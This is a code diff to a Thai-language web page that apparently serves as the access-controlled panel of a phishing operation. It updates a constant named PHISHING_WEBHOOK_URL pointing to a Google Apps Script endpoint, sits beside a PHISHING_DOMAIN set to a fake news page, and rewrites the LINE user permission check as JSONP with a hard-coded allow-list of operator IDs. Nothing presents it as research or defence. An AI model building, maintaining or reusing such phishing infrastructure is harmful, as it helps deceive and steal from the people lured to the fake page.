@@ -488,7 +488,7 @@
 
         .status.error {
             background-color: rgba(255, 82, 82, 0.1);
-            color: var (--error-color);
+            color: var(--error-color);
             border: 1px solid rgba(255, 82, 82, 0.3);
         }
 
@@ -741,7 +741,7 @@
         
         // URL สำหรับ webhook
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec';
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxqXldnOqBJv2S2kmIDwtB81WDCl5UFVo3_RuJctySnUK0_r_2P66xI1RfiihYJmHuq/exec';
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbw8kt_D8Igps38xn8AwjVxiM_jmfiak_C2VXlfxVbMI_VcY_FyiBidVVSI_11BRx_45/exec';
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงานเมื่อโหลดหน้าเว็บ
@@ -812,67 +812,74 @@
         
         // ตรวจสอบสิทธิ์ผู้ใช้
         async function checkUserPermission(userId) {
-            try {
-                console.log("กำลังตรวจสอบสิทธิ์ผู้ใช้:", userId);
-                
-                const response = await fetch(LINE_OA_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        action: 'checkUserPermission',
-                        userId: userId
-                    })
-                });
-
-                // Check if the response status is OK (e.g., 200-299)
-                if (!response.ok) {
-                    console.error(`Error checking permission: Server responded with status ${response.status}`);
-                    // Optionally, try fallback if server error occurs
-                    // return checkUserPermissionFallback(userId); 
-                    return false; // Default to no permission on server error
-                }
-
-                // Try parsing the response as JSON
+            return new Promise((resolve, reject) => {
                 try {
-                    const data = await response.json();
-                    console.log("ผลการตรวจสอบสิทธิ์:", data);
-                    // Ensure the expected property exists
-                    if (typeof data.hasPermission === 'boolean') {
-                        return data.hasPermission;
-                    } else {
-                        console.error("Invalid response format from permission check:", data);
-                        return false; // Default to no permission if format is wrong
-                    }
-                } catch (parseError) {
-                    // Handle cases where response is not valid JSON
-                    console.error("ไม่สามารถแปลง response เป็น JSON:", parseError);
-                    // Optionally, try fallback if parsing fails
-                    // return checkUserPermissionFallback(userId);
-                    return false; // Default to no permission on parsing error
+                    console.log("กำลังตรวจสอบสิทธิ์ผู้ใช้:", userId);
+                    
+                    // สร้าง unique callback name
+                    const callbackName = 'permCallback_' + new Date().getTime();
+                    
+                    // สร้าง global callback function
+                    window[callbackName] = function(data) {
+                        console.log("ได้รับข้อมูลสิทธิ์:", data);
+                        
+                        if (data && data.hasPermission !== undefined) {
+                            resolve(data.hasPermission === true);
+                        } else {
+                            console.log("ข้อมูลสิทธิ์ไม่ถูกต้อง, ใช้การตรวจสอบสำรอง");
+                            resolve(checkUserPermissionFallback(userId));
+                        }
+                        
+                        // ลบ callback หลังจากใช้งานเสร็จ
+                        delete window[callbackName];
+                    };
+                    
+                    // สร้าง script tag สำหรับ JSONP
+                    const script = document.createElement('script');
+                    const url = new URL(LINE_OA_WEBHOOK_URL);
+                    url.searchParams.append('action', 'checkUserPermission');
+                    url.searchParams.append('userId', userId);
+                    url.searchParams.append('callback', callbackName);
+                    url.searchParams.append('_', new Date().getTime()); // ป้องกันการ cache
+                    
+                    script.src = url.toString();
+                    script.onerror = function() {
+                        console.error('เกิดข้อผิดพลาดในการโหลด permission script');
+                        resolve(checkUserPermissionFallback(userId));
+                        
+                        // ลบ callback หากเกิดข้อผิดพลาด
+                        delete window[callbackName];
+                    };
+                    
+                    // เพิ่ม script เข้าไปใน DOM
+                    document.body.appendChild(script);
+                    
+                    // ตั้งเวลาหมดเวลา 10 วินาที
+                    setTimeout(() => {
+                        if (window[callbackName]) {
+                            console.log("การตรวจสอบสิทธิ์หมดเวลา, ใช้การตรวจสอบสำรอง");
+                            delete window[callbackName];
+                            resolve(checkUserPermissionFallback(userId));
+                        }
+                    }, 10000);
+                    
+                } catch (error) {
+                    console.error('Error checking permission:', error);
+                    resolve(checkUserPermissionFallback(userId));
                 }
-
-            } catch (error) {
-                // Handle network errors or other issues with the fetch itself
-                console.error('Error checking permission (fetch failed):', error);
-                // Use fallback only if the fetch itself fails
-                return checkUserPermissionFallback(userId);
-            }
+            });
         }
         
         // ตรวจสอบสิทธิ์แบบสำรอง
         function checkUserPermissionFallback(userId) {
-            // This fallback is kept as a last resort if the primary check fails completely.
-            console.warn("ใช้การตรวจสอบสิทธิ์แบบสำรอง (Fallback)");
+            // รายชื่อ userId ที่มีสิทธิ์ใช้งาน (เพิ่มรายชื่อผู้ใช้ที่มีสิทธิ์ใช้งานจริง)
             const approvedUserIds = [
-                'U69aa2cb90c9f40291278c346c50dc021' // ไอดีผู้ดูแลระบบ
-                // Add other approved user IDs here if needed for fallback
+                'U69aa2cb90c9f40291278c346c50dc021', // ไอดีผู้ดูแลระบบ
+                'Ud7c2a83d5607602f3e7d00bb36a5cadb', // เพิ่มรายชื่อผู้ใช้ที่มีสิทธิ์ใช้งาน
+                'U41b4fbb2e0c1b40c94344c48eb533b36'  // เพิ่มรายชื่อผู้ใช้ที่มีสิทธิ์ใช้งาน
             ];
             
-            const hasFallbackPermission = approvedUserIds.includes(userId);
-            console.log(`ผลการตรวจสอบสิทธิ์ (Fallback) สำหรับ ${userId}: ${hasFallbackPermission}`);
-            return hasFallbackPermission;
+            return approvedUserIds.includes(userId);
         }
         
         // เปิดใช้งานฟอร์ม
